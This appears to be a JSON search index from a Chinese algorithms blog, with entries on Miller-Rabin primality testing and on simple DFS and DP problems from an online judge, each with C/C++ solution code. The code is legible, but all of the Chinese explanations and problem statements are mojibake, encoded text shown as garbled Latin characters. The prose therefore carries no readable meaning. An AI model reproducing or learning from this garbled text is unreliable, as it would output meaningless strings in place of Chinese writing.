äº’ç´ ï¼‰éƒ½æœ‰ $b^{n-1}â‰¡ 1 (mod\\ n)$ æˆç«‹ï¼Œåˆ™åˆæ•° n ä¸º Carmichael æ•°ã€‚æ¯”å¦‚ 561ã€‚è¿™ç§æ•°çš„å­˜åœ¨ä½¿å¾—ä¸Šé¢çš„æ–¹æ³•æ²¦ä¸º â€œä¼ªç´ æ€§æµ‹è¯•â€ã€‚ äºŒæ¬¡æ¢æµ‹å®šç†ï¼šå¦‚æœ p æ˜¯å¥‡ç´ æ•°ï¼Œx æ˜¯å°äº p çš„æ­£æ•´æ•°ï¼Œåˆ™ $x^2 â‰¡ 1(mod\\ p)$ çš„è§£ä¸º $x = 1$ æˆ– $x = p - 1(mod\\ p)$ï¼Œè¿™æ˜¯ç”±æ¨¡è¿ç®—çš„å¾ªç¯ç‰¹æ€§å¯¼è‡´çš„ã€‚ åˆ©ç”¨äºŒæ¬¡æ¢æµ‹å®šç†ï¼Œåªéœ€è¦æ¢æµ‹ s æ¬¡å°±å¯ä»¥å°†é”™è¯¯ç‡é™åˆ° $2^{-s}$ï¼ˆå¥½åƒæ˜¯è¿™æ ·å§ã€‚ã€‚åæ­£å¾ˆä½å°±å¯¹äº†ï¼‰ï¼Œå› æ­¤ä¹Ÿä¸ä¼šå¤šèŠ±å¤šå°‘æ—¶é—´ã€‚ è®°å¾—åˆ¤ç´ æ—¶çš„ç»†èŠ‚å¤„ç†ä»¥åŠå¿«é€Ÿå¹‚å–æ¨¡ã€‚ ","date":"2018-01-19","objectID":"/miller-rabin/:1:0","tags":["æ•°å­¦"],"title":"Miller-Rabin ç´ æ€§æµ‹è¯•ä¸äºŒæ¬¡æ¢æµ‹","uri":"/miller-rabin/"},{"categories":["ç®—æ³•"],"content":"ä»£ç  å¾ˆç®€æ´çš„æ¨¡æ¿ï¼š #include \u003ccstdio\u003eusing namespace std; typedef long long ll; ll prime[5] = {2, 3, 5, 233, 331}; ll pow_mod(ll a, ll n, ll mod) { ll ret = 1; while (n) { if (n \u0026 1) ret = ret * a % mod; a = a * a % mod; n \u003e\u003e= 1; } return ret; } int miller_rabin(ll n) { if (n \u003c 2 || (n != 2 \u0026\u0026 !(n \u0026 1))) return 0; ll s = n - 1; while (!(s \u0026 1)) s \u003e\u003e= 1; for (int i = 0; i \u003c 5; ++i) { if (n == prime[i]) return 1; ll t = s, m = pow_mod(prime[i], s, n); while (t != n - 1 \u0026\u0026 m != 1 \u0026\u0026 m != n - 1) { m = m * m % n; t \u003c\u003c= 1; } if (m != n - 1 \u0026\u0026 !(t \u0026 1)) return 0; } return 1; } int main() { ll n; while (~scanf(\"%lld\", \u0026n)) printf(\"%s\\n\", miller_rabin(n) ? \"YES\" : \"NO\"); return 0; } ","date":"2018-01-19","objectID":"/miller-rabin/:2:0","tags":["æ•°å­¦"],"title":"Miller-Rabin ç´ æ€§æµ‹è¯•ä¸äºŒæ¬¡æ¢æµ‹","uri":"/miller-rabin/"},{"categories":["ç®—æ³•"],"content":"é¢˜ç›®å…¨éƒ¨æ¥è‡ª EOJã€‚æ–°å¹´å¼€å§‹ç”¨ C++ äº†ã€‚ ","date":"2018-01-04","objectID":"/dfs-simple/:0:0","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"1012 The 3n+1 Problem å¯¹ä¸€ä¸ªæ•°ï¼Œå¦‚æœæ˜¯å¥‡æ•°åˆ™ä¹˜ 3 åŠ  1ï¼Œæ˜¯å¶æ•°åˆ™é™¤ä»¥ 2ã€‚é‡å¤ç›´è‡³å˜ä¸º 1ï¼Œæ€»æ“ä½œæ¬¡æ•°è®°ä¸º cã€‚ç»™å®šåŒºé—´ [i,j]ï¼Œæ±‚åŒºé—´å†…æœ€å¤§å¯èƒ½å–åˆ°çš„ c çš„å€¼ã€‚ ","date":"2018-01-04","objectID":"/dfs-simple/:1:0","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ æŒ‰ç…§é¢˜æ„ï¼Œç¦»çº¿ DFS å³å¯ã€‚ #include \u003cstdio.h\u003e#define MAX 1000000 int sum[MAX + 1], m, n; int dfs(long long k) { if (k \u003c= MAX \u0026\u0026 sum[k]) return sum[k]; int ans = 1; if (k % 2) ans += dfs(3 * k + 1); else ans += dfs(k / 2); if (k \u003c= MAX) sum[k] = ans; return ans; } int main() { int i, j, k, max; sum[1] = 1; for (i = 2; i \u003c= MAX; ++i) sum[i] = dfs(i); while(~scanf(\"%d%d\", \u0026i, \u0026j)){ printf(\"%d %d\", i, j); if (i\u003e j){int tmp = i; i = j; j = tmp;} max = 0; for (k = i; k \u003c= j; ++k) if (sum[k] \u003e max) max = sum[k]; printf(\"%d\\n\", max); } return 0; } ","date":"2018-01-04","objectID":"/dfs-simple/:1:1","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"1114 ç´ æ•°ç¯ ä¸€ä¸ªç”±è‡ªç„¶æ•° 1â€¦n (nâ‰¤18) ç´ æ•°ç¯å°±æ˜¯å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç¯ä¸Šä»»æ„ä¸¤ä¸ªèŠ‚ç‚¹ä¸Šæ•°å€¼ä¹‹å’Œä¸ºç´ æ•°ã€‚ 1 / \\ 4 2 \\ / 3 è¦æ±‚å»ºç«‹ä¸€ä¸ªä» 1 åˆ° n çš„ç´ æ•°ç¯ã€‚ ","date":"2018-01-04","objectID":"/dfs-simple/:2:0","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ è€ƒè™‘åˆ°æ•°æ®èŒƒå›´è¾ƒå°ï¼Œæˆ‘ä»¬å…ˆç”¨ prime æ•°ç»„å­˜æ”¾ç´ æ•°ã€‚ç„¶å DFS ä¸ç›¸é‚»æ•°ä¹‹å’Œæ˜¯å¦ä¸ºç´ æ•°ï¼Œæœ€åç‰¹åˆ¤å¤´å’Œå°¾ä¹‹å’Œçš„æƒ…å†µã€‚ #include\u003cbits/stdc++.h\u003eusing namespace std; int n, prime[50] = {0,0,1,1,0,1,0,1,0,0,0,1,0,1,0,0,0,1, 0,1,0,0,0,1,0,0,0,0,0,1,0,1,0,0,0,0,0,1,0,1,0,1,0,1,0}, vis[50], a[50] = {1}; void dfs(int now) { if (now == n \u0026\u0026 prime[a[0]+a[n-1]]) { for (int i = 0; i \u003c n - 1; ++i) printf(\"%d\", a[i]); printf(\"%d\\n\", a[n-1]); } else for (int i = 2; i \u003c= n; ++i) if (!vis[i] \u0026\u0026 prime[i+a[now-1]]) { a[now] = i; vis[i] = 1; dfs(now+1); vis[i] = 0; } } int main() { cin \u003e\u003e n; dfs(1); return 0; } ","date":"2018-01-04","objectID":"/dfs-simple/:2:1","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"1130 n çš‡åé—®é¢˜ åˆ©ç”¨å›æº¯æ³•è®¡ç®— n*n æ£‹ç›˜ä¸­æ‘†æ”¾ n ä¸ªçš‡åçš„æ–¹æ¡ˆæ•°ã€‚ ","date":"2018-01-04","objectID":"/dfs-simple/:3:0","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ è§„åˆ™æ˜¯ä¸¤ä¸ªçš‡åä¸èƒ½åœ¨åŒä¸€ç›´çº¿ / æ–œçº¿ä¸Šã€‚æ³¨æ„å¥½ if è¯­å¥çš„æ¡ä»¶ä»¥åŠè¡Œåˆ—å…³ç³»ã€‚ #include \u003ccstdio\u003e#include \u003ccmath\u003eusing namespace std; int n, cnt, pos[10]; bool ok(int row) { for (int i = 0; i \u003c row; ++i) if((pos[row] == pos[i]) || (abs(row-i) == abs(pos[row]-pos[i]))) return false; return true; } void queen(int row) { int col; if (row == n) ++cnt; else for (col = 0; col \u003c n; ++col){ pos[row] = col; if (ok(row)) queen(row+1); } } int main() { int t; while(~scanf(\"%d\", \u0026t)){ while(t--){ cnt = 0; scanf(\"%d\", \u0026n); queen(0); printf(\"%d\\n\", cnt); } } return 0; } ","date":"2018-01-04","objectID":"/dfs-simple/:3:1","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"2457 Expressions ç»™å‡ºåç¼€è¡¨è¾¾å¼ï¼Œè°ƒæ¢æ¬¡åºä½¿å¾—ç”¨é˜Ÿåˆ—è®¡ç®—æ‰€å¾—ç»“æœä¸ç”¨æ ˆè®¡ç®—ç›¸åŒã€‚å…¶ä¸­å°å†™å­—æ¯æ˜¯æ“ä½œæ•°ï¼Œå¤§å†™å­—æ¯æ˜¯è¿ç®—ç¬¦ã€‚å¦‚ï¼š Input: 2 xyPzwIM abcABdefgCDEF Output: wzyxIPM gfCecbDdAaEBF ","date":"2018-01-04","objectID":"/dfs-simple/:4:0","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ ä»åå¾€å‰è¯»ï¼Œé‡åˆ°æ“ä½œæ•°å°±å­˜å…¥æ•°ç»„ï¼Œé‡åˆ°è¿ç®—ç¬¦å°±ç»§ç»­ DFS ä¸¤æ¬¡ï¼ˆå¯¹åº”è¿™ä¸€è¿ç®—ç¬¦çš„ä¸¤ä¸ªæ“ä½œæ•°ï¼‰ã€‚æœ€åå€’åºè¾“å‡ºæ•°ç»„ã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; string s; vector\u003cstring\u003e v; int pos; void dfs(int d) { if (pos \u003c 0) return; v[d] += s[pos--]; if (islower(s[pos+1])) return; dfs(d+1); dfs(d+1); } int main() { int t; cin \u003e\u003e t; while (t--) { cin \u003e\u003e s; v.assign(s.size(), \"\"); pos = s.size()-1; dfs(0); for (vector\u003cstring\u003e::reverse_iterator it = v.rbegin(); it != v.rend(); ++it) cout \u003c\u003c *it; cout \u003c\u003c endl; } return 0; } ","date":"2018-01-04","objectID":"/dfs-simple/:4:1","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"2856 ä»°æœ›æ˜Ÿç©º ç”¨é‚»æ¥çŸ©é˜µçš„æ–¹å¼ç»™å‡ºå›¾ï¼Œæ±‚å›¾ä¸­å…«è¿é€šå—ä¸ªæ•°ã€‚ ","date":"2018-01-04","objectID":"/dfs-simple/:5:0","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ å„å¤§ OJ ä¸Šéƒ½æœ‰çš„ç»å…¸ DFS å…¥é—¨é¢˜ã€‚ ä¸€ç§ç±»ä¼¼æ¨¡æ¿çš„å†™æ³•ï¼ˆç¨åŠ æ”¹åŠ¨å¯ä»¥æ±‚å››è¿é€šå—ã€æœ€å¤§è¿é€šå—ã€æ¬¡å¤§è¿é€šå—ç­‰ç­‰ï¼‰ï¼š éå†æ‰€æœ‰ä¸ä¸ºç©ºçš„ç‚¹ï¼Œå‘å››ä¸ªæ–¹å‘ DFS å¹¶æŠŠèµ°è¿‡çš„åœ°ç‚¹æ ‡è®°ä¸ºç©ºã€‚DFS æ¬¡æ•°å³ä¸ºè¿é€šå—ä¸ªæ•°ã€‚ #include \u003ccstdio\u003e int row, col, a[1005][85]; void dfs(int x, int y) { a[x][y] = 0; for (int dx = -1; dx \u003c= 1; ++dx) for (int dy = -1; dy \u003c= 1; ++dy) { int nx = x + dx, ny = y + dy; if (0 \u003c= nx \u0026\u0026 nx \u003c row \u0026\u0026 0 \u003c= ny \u0026\u0026 ny \u003c= col \u0026\u0026 a[nx][ny]) dfs(nx, ny); } } int main(void) { char tmp; int i, j; while(~scanf(\"%d%d\\n\", \u0026col, \u0026row)){ int cnt = 0; for (i = 0; i \u003c row; ++i){ for (j = 0; j \u003c col; ++j){ scanf(\"%c\", \u0026tmp); if (tmp =='*') a[i][j] = 1; } getchar(); } for (i = 0; i \u003c row; ++i) for (j = 0; j \u003c col; ++j) if (a[i][j]){ dfs(i, j); ++cnt; } printf(\"%d\\n\", cnt); } return 0; } ","date":"2018-01-04","objectID":"/dfs-simple/:5:1","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"2859 è¡¨è¾¾å¼çš„ä¸ªæ•° ç»™å®š 123456789ï¼Œåœ¨ æ•°å­—ä¸­ æ·»åŠ  + å’Œ -ï¼Œæˆ–è€…ä»€ä¹ˆéƒ½ä¸åŠ ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå½“ç„¶ä½ è‚¯å®šä¼šç®—è¿™ä¸ªè¡¨è¾¾å¼çš„å€¼ã€‚ç„¶åå¦‚æœç»™ä½ è¿™ä¸ªè¡¨è¾¾å¼çš„å€¼ï¼Œä½ ä¼šæ±‚æœ‰å¤šå°‘ä¸ªä¸åŒçš„è¡¨è¾¾å¼èƒ½å¤Ÿå¾—åˆ°è¿™ä¸ªå€¼å‘¢ï¼Ÿ ","date":"2018-01-04","objectID":"/dfs-simple/:6:0","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ ç”±äºæœ¬é¢˜æ•°å­—ç‰¹æ®Šï¼Œå¯ä»¥ç”¨æ•°å­—æœ¬èº«æ¥ç§»åŠ¨è¦ DFS çš„ä½ç½®ã€‚ä½ç½®ç¡®å®šåå¯¹åŠ å·å‡å·åˆ†åˆ« DFSã€‚ç”±äºéœ€è¦åŠ åœ¨æ•°å­—ä¸­ï¼Œæ‰€ä»¥å‡å·ä¸èƒ½åŠ åœ¨å¼€å¤´ã€‚ #include \u003ccstdio\u003e#include \u003cmap\u003eusing namespace std; map\u003cint, int\u003e ans; typedef long long ll; void dfs(ll sum, int cnt) { if (cnt\u003e 9){ ++ans[sum]; return; } ll ret = 0; for (int i = cnt; i \u003c= 9; ++i){ ret = ret * 10 + i; dfs(sum + ret, i + 1); if (cnt\u003e 1) dfs(sum - ret, i + 1); } } int main(void) { int n; dfs(0, 1); while(~scanf(\"%d\", \u0026n)) printf(\"%d\\n\", ans[n]); return 0; } ","date":"2018-01-04","objectID":"/dfs-simple/:6:1","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"2912 æ”¾ä¹¦ åœ¨ä¹¦æ¶ä¸Šæ”¾æœ‰ç¼–å·ä¸º 1,2,â€¦,n çš„ n æœ¬ä¹¦ã€‚ç°å°† n æœ¬ä¹¦å…¨éƒ¨å–ä¸‹ç„¶åå†æ”¾å›å»ï¼Œå½“æ”¾å›å»æ—¶è¦æ±‚æ¯æœ¬ä¹¦éƒ½ä¸èƒ½æ”¾åœ¨åŸæ¥çš„ä½ç½®ä¸Šã€‚ ä¾‹å¦‚ n=3 æ—¶ï¼šåŸæ¥ä½ç½®ä¸ºï¼š1,2,3ã€‚æ”¾å›å»æ—¶åªèƒ½ä¸ºï¼š3,1,2 æˆ– 2,3,1 è¿™ä¸¤ç§ã€‚ å¯¹äºæ¯ä¸€ä¸ª nï¼Œæ±‚æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶çš„æ”¾æ³•æœ‰å¤šå°‘ï¼Ÿ å¯¹äºæ¯ç»„æµ‹è¯•æ•°æ®ï¼Œå¦‚æœ n\u003c8ï¼Œè¾“å‡ºæ¯ç§æ”¾æ³•ï¼ˆæ¯ç§æ”¾æ³•å ä¸€è¡Œï¼Œæ”¾æ³•æŒ‰ç…§å­—å…¸åºä»å°åˆ°å¤§æ’åˆ—ï¼‰ï¼Œå¦‚æœ n\u003e=8ï¼Œåªéœ€è¦è¾“å‡ºæ”¾æ³•æ€»æ•°ã€‚ ","date":"2018-01-04","objectID":"/dfs-simple/:7:0","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ å¦‚æœåªéœ€è¦è¾“å‡ºæ”¾æ³•æ€»æ•°ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥å¥—ç”¨é”™æ’å…¬å¼ D(n)=(n-1)[D(n-2)+D(n-1)] æˆ–è€… D(n)=[n!/e+0.5]ã€‚ä¸è¿‡æœ¬é¢˜å¯¹äº n\u003c8 çš„æƒ…å†µéœ€è¦è¾“å‡ºå…·ä½“æ–¹æ³•ï¼Œæ‰€ä»¥ä¾ç„¶å¾—é  DFS æ¥å®ç°ã€‚ #include\u003cbits/stdc++.h\u003eusing namespace std; int v[11], a[11], n, cnt; void dfs(int d) { if (d == n+1) { if (n \u003c 8) { for (int i = 1; i \u003c= n; ++i) cout \u003c\u003ca[i]; cout \u003c\u003c endl; }else ++cnt; return; } for (int i = 1; i \u003c= n; ++i) { if (!v[i]) { v[i] = 1; if (i != d) { if (n \u003c 8) a[d] = i; dfs(d+1); } v[i] = 0; } } } int main() { int t; cin \u003e\u003e t; while (t--) { cin \u003e\u003e n; cnt = 0; memset(v, 0, sizeof(v)); dfs(1); if (n\u003e= 8) cout \u003c\u003c cnt \u003c\u003c endl; } return 0; } ","date":"2018-01-04","objectID":"/dfs-simple/:7:1","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"3279 çˆ±ç‹—ç‹—çš„ä¸¤ä¸ª dalao n åªé‡é‡ä¸º w1...wn çš„ç‹—è£…å…¥è½½é‡ä¸º M çš„ç¼†è½¦ï¼Œæ±‚æœ€å°‘éœ€è¦å¤šå°‘ç¼†è½¦ã€‚ 1\u003c=n\u003c=18 1\u003c=M\u003c=1e9 ","date":"2018-01-04","objectID":"/dfs-simple/:8:0","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ ç”±äº M è¾ƒå¤§ï¼Œéš¾ä»¥ç”¨ä¸ŠèƒŒåŒ… DPï¼Œåªèƒ½æœç´¢æ¥åšã€‚ #include\u003cbits/stdc++.h\u003eusing namespace std; const int maxn = 20; int w[maxn], dp[maxn], n, m, ans; bool dfs(int x) { if (x\u003e n) return 1; for (int i = 1; i \u003c= x \u0026\u0026 i \u003c= ans; ++i) if (dp[i] + w[x] \u003c= m) { dp[i] += w[x]; if(dfs(x+1)) return 1; dp[i] -= w[x]; } return 0; } int main() { cin \u003e\u003e n \u003e\u003e m; for (int i = 1; i \u003c= n; ++i) cin \u003e\u003e w[i]; sort(w+1, w+n+1, greater\u003cint\u003e()); for (ans = 1; ans \u003c= n; ++ans) { memset(dp, 0, sizeof(dp)); if (dfs(1)) break; } cout \u003c\u003c ans \u003c\u003c endl; return 0; } ","date":"2018-01-04","objectID":"/dfs-simple/:8:1","tags":["æœç´¢","æ¨¡ç‰ˆ"],"title":"ç®€å• DFS é¢˜åˆé›†","uri":"/dfs-simple/"},{"categories":["ç®—æ³•"],"content":"ç»å…¸ä¹‹æ‰€ä»¥èƒ½è¢«ç§°ä¸ºç»å…¸ï¼Œæ˜¯å› ä¸ºå…¶ä¸­è•´å«çš„æ— é™å¯èƒ½ã€‚ ","date":"2017-12-23","objectID":"/dp-simple/:0:0","tags":["åŠ¨æ€è§„åˆ’"],"title":"ç®€å• DP é¢˜åˆé›†","uri":"/dp-simple/"},{"categories":["ç®—æ³•"],"content":"1075 åº†ç¥è¿è¯„æˆåŠŸ ä¸€ä¸ªè›‹ç³•åˆ‡ n åˆ€ï¼Œæ±‚æœ€å¤šå¯ä»¥åˆ‡æˆå‡ å—ã€‚ ","date":"2017-12-23","objectID":"/dp-simple/:1:0","tags":["åŠ¨æ€è§„åˆ’"],"title":"ç®€å• DP é¢˜åˆé›†","uri":"/dp-simple/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ å¯¹ä¸‰ç»´é—®é¢˜ï¼Œé™ç»´å¤„ç†ä¸å¤±ä¸ºä¸€ç§å¥½æ–¹æ³•ã€‚æˆ‘ä»¬å…ˆè€ƒè™‘äºŒç»´æƒ…å†µï¼š n æ¡ç›´çº¿åˆ†å‰²ä¸€ä¸ªå¹³é¢ï¼Œæœ€å¤šå¯ä»¥åˆ†å‰²æˆå‡ å—ï¼Ÿ å‡è®¾ n-1 æ¡ç›´çº¿å·²ç»ç¡®å®šï¼ˆå¹¶ä¸”å·²ç»æ˜¯æœ€ä¼˜è§£ï¼Œä¸‹åŒï¼‰ï¼Œé‚£ä¹ˆç¬¬ n æ¡ç›´çº¿éœ€è¦ä¸å‰ n-1 æ¡ç›´çº¿äº¤äº n-1 ä¸ªä¸åŒçš„ç‚¹ï¼Œè¿™ä½¿ç¬¬ n æ¡ç›´çº¿è¢«åˆ†ä¸º n ä»½ï¼Œå¹³é¢åˆ™å°†è¢«å¤šåˆ†å‡º n ä¸ªåŒºåŸŸã€‚ æˆ‘ä»¬è®¾äºŒç»´æƒ…å†µçš„ç­”æ¡ˆä¸º f(n)ï¼Œåˆ™ f(n)=f(n-1)+nï¼Œæ¨å¾—é€šé¡¹å…¬å¼ f(n)=1+n(n+1)/2ã€‚ æ¨å¹¿åˆ°ä¸‰ç»´ï¼Œè®¾æ­¤æ—¶ç­”æ¡ˆä¸º s(n)ã€‚n-1 ä¸ªå¹³é¢å·²ç»ç¡®å®šï¼Œç¬¬ n ä¸ªå¹³é¢éœ€è¦ä¸å‰ n-1 ä¸ªå¹³é¢æœ‰ n-1 æ¡äº¤çº¿ï¼Œè¿™ä½¿ç¬¬ n ä¸ªå¹³é¢è¢«åˆ†ä¸º f(n-1) ä»½ï¼Œç©ºé—´åˆ™å°†è¢«å¤šåˆ†å‡º f(n-1) ä¸ªåŒºåŸŸã€‚æˆ‘ä»¬å¾—åˆ°ï¼šs(n)=s(n-1)+f(n-1)=s(n-1)+1+n(n-1)/2ã€‚ è¾¹ç•Œæ¡ä»¶ä¸º s(0)=1ã€‚ #include \u003cstdio.h\u003e int main(){ int a, i; long long s[1001]; s[0] = 1; for (i = 1; i \u003c 1001; ++i) s[i] = s[i - 1] + i * (i - 1) / 2 + 1; while (scanf(\"%d\", \u0026a) \u0026\u0026 a) printf(\"%lld\\n\", s[a]); return 0; } ","date":"2017-12-23","objectID":"/dp-simple/:1:1","tags":["åŠ¨æ€è§„åˆ’"],"title":"ç®€å• DP é¢˜åˆé›†","uri":"/dp-simple/"},{"categories":["ç®—æ³•"],"content":"1015 æ ¸ç”µç«™ ä¸€ä¸ªæ ¸ç”µç«™æœ‰ N ä¸ªæ”¾æ ¸ç‰©è´¨çš„å‘ï¼Œå‘æ’åˆ—åœ¨ä¸€æ¡ç›´çº¿ä¸Šã€‚ å¦‚æœè¿ç»­ M ä¸ªå‘ä¸­æ”¾å…¥æ ¸ç‰©è´¨ï¼Œåˆ™ä¼šå‘ç”Ÿçˆ†ç‚¸ï¼Œäºæ˜¯ï¼Œåœ¨æŸäº›å‘ä¸­å¯èƒ½ä¸æ”¾æ ¸ç‰©è´¨ã€‚ ä»»åŠ¡ï¼šå¯¹äºç»™å®šçš„ N å’Œ Mï¼Œæ±‚ä¸å‘ç”Ÿçˆ†ç‚¸çš„æ”¾ç½®æ ¸ç‰©è´¨çš„æ–¹æ¡ˆæ€»æ•°ã€‚ ","date":"2017-12-23","objectID":"/dp-simple/:2:0","tags":["åŠ¨æ€è§„åˆ’"],"title":"ç®€å• DP é¢˜åˆé›†","uri":"/dp-simple/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ è®¾ç¬¬ n ä¸ªå‘ä¸å‘ç”Ÿçˆ†ç‚¸çš„æ–¹æ¡ˆæ•°ä¸º f(n)ï¼Œæˆ‘ä»¬å‡è®¾å‰ n-1 ä¸ªå‘å·²ç»ç¡®å®šã€‚åˆ†ä¸¤ç§æƒ…å†µï¼š å·²ç»æœ‰è¿ç»­ m-1 ä¸ªæ ¸ç‰©è´¨ï¼Œé‚£ä¹ˆç¬¬ n ä¸ªå‘åªèƒ½ä¸æ”¾æ ¸ç‰©è´¨ï¼Œä¸”è¿™ m-1 ä¸ªå‘å‰çš„é‚£ä¸ªå‘ä¹Ÿä¸èƒ½æ”¾æ ¸ç‰©è´¨ã€‚æ–¹æ¡ˆæ•°ä¸º f((n-1)-(m-1)-1)=f(n-m-1)ã€‚ å¦åˆ™ï¼Œç¬¬ n ä¸ªå‘å¯ä»¥é€‰æ‹©æ”¾æˆ–ä¸æ”¾ã€‚æ–¹æ¡ˆæ•°ä¸º 2*[f(n-1)-f(n-m-1)]ã€‚ è¾¹ç•Œæ¡ä»¶ f(0)=1ã€‚ å…·ä½“è®¡ç®—æ—¶å¯ä»¥ç”¨ DP çš„é€’æ¨å½¢å¼å†™ï¼Œä¹Ÿå¯ä»¥åƒå¦‚ä¸‹ä»£ç ä¸­ç”¨ 2 çš„å¹‚è®¡ç®—ï¼š #include \u003cstdio.h\u003e#include \u003cmath.h\u003e int main(void) { int n, m, i; long long nuc[60]; nuc[0] = 1; while (~scanf(\"%d%d\", \u0026n, \u0026m)){ for (i = 1; i \u003c= 50; ++i){ if (i \u003c m) nuc[i] = (long long)pow(2, i); else if(i == m) nuc[i] = (long long)pow(2, m) - 1; else nuc[i] = 2 * nuc[i - 1] - nuc[i - m - 1]; } printf(\"%I64d\\n\", nuc[n]); } return 0; } è¿™é‡Œä¸èƒ½é¢„å¤„ç† nuc æ•°ç»„ï¼Œå› ä¸º m æœªçŸ¥ã€‚ ","date":"2017-12-23","objectID":"/dp-simple/:2:1","tags":["åŠ¨æ€è§„åˆ’"],"title":"ç®€å• DP é¢˜åˆé›†","uri":"/dp-simple/"},{"categories":["ç®—æ³•"],"content":"3267 è¶³çƒé”¦æ ‡èµ› è®¡åˆ†æ¿ä¸Šçš„æ¯ä¸€ä½éƒ½æŒ‰é¡ºåºæŒ‚äº† 0 åˆ° 9 è¿™ 10 ä¸ªç‰Œå­ï¼Œæ‰€ä»¥å¯ä»¥è¡¨ç¤º 000 è‡³ 999ã€‚å½“å…¶ä¸­ä¸€ä¸ªé˜Ÿçš„å¾—åˆ†ä» 010 å˜æˆ 011 æ—¶ï¼Œè®¡åˆ†å‘˜åªè¦å°†æœ€åä¸€ä½çš„æœ€å‰é¢çš„ç‰Œå­å‘åç¿»å³å¯ï¼Œå…±éœ€ç¿»åŠ¨ä¸€å—ç‰Œå­ï¼›å½“å¾—åˆ†ä» 019 å˜æˆ 020 æ˜¯ï¼Œç”±äº 9 åé¢å·²ç»æ²¡æœ‰ç‰Œå­äº†ï¼Œæ‰€ä»¥è®¡åˆ†å‘˜è¦å°† 0 åˆ° 9 å…¨éƒ¨ç¿»åˆ°å‰é¢ï¼Œå¹¶å°†å€’æ•°ç¬¬äºŒä½çš„ç‰Œå­ 1 ç¿»åˆ°åé¢ï¼Œæ‰€ä»¥å…±éœ€ç¿»åŠ¨ 10 å—ç‰Œå­ã€‚ ç°åœºçš„è®¡åˆ†ç‰Œå’Œå›¾ä¸­æ‰€ç¤ºè¿˜æ˜¯å­˜åœ¨å·®å¼‚çš„ï¼Œç°åœºçš„è®¡åˆ†ç‰Œä¼šå¾ˆå¤§ï¼Œå¾ˆé‡ï¼Œæ‰€ä»¥ç¿»æ¯å—ç‰Œå­éƒ½è¦æ¶ˆè€— 1 ç‚¹ä½“åŠ›ã€‚ ä½ æ˜¯è®¡åˆ†å‘˜ï¼Œç°åœ¨æ¯”èµ›è¿˜å‰©ä¸‹æœ€åååˆ†é’Ÿã€‚ç°åœ¨æœ‰ä¸€ä¸ªé¢„è¨€å®¶å‘Šè¯‰ä½ åœ¨è¿™ååˆ†é’Ÿé‡Œï¼ŒåŒæ–¹å¾—åˆ†å…±è®¡å¤šå°‘ï¼›ä½†ä»–æ²¡æœ‰å‘Šè¯‰ä½ åŒæ–¹å¾—åˆ†å„æ˜¯å¤šå°‘ã€‚æ‰€ä»¥ä½ æƒ³è¦çŸ¥é“ä½ è¦èŠ±è´¹çš„ä½“åŠ›å€¼æœ€å¤šæ˜¯å¤šå°‘ã€‚ ","date":"2017-12-23","objectID":"/dp-simple/:3:0","tags":["åŠ¨æ€è§„åˆ’"],"title":"ç®€å• DP é¢˜åˆé›†","uri":"/dp-simple/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ å…ˆæ¨¡æ‹Ÿç¿»ç‰Œï¼Œé¢„å¤„ç†è®°å½•ä½“åŠ›çš„æ•°ç»„ã€‚ç„¶åæšä¸¾åŒæ–¹å¾—åˆ†æƒ…å†µï¼Œæ±‚æœ€å¤§å€¼ã€‚ #include \u003cstdio.h\u003e int dp[1001]={0}; void init() { int i; for (i = 1; i \u003c= 999; ++i){ if (i % 100 == 0) dp[i] = 